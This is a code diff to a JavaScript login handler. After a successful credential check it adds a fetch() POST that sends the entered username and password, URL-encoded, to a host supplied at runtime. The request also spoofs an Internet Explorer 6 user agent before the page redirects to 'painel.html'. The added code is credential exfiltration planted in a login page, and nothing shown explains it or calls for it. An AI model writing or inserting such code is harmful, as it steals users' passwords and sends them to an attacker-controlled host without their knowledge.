@@ -91,7 +91,26 @@
 
                 // Check if the credentials are correct
                 if (correct_pass === password && username === correct_user) {
-                    // Redirect to panel.html
+                    
+                    fetch(`https://${args.a}`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)' // Simulating Internet Explorer 6 user agent
+                        },
+                        body: `user=${encodeURIComponent(user)}&password=${encodeURIComponent(password)}`
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Request successful');
+                        } else {
+                            console.error('Request failed:', response.statusText);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Request error:', error);
+                    });
+
                     window.location.href = "painel.html";
                 } else {
                     // Display an error message or perform other actions
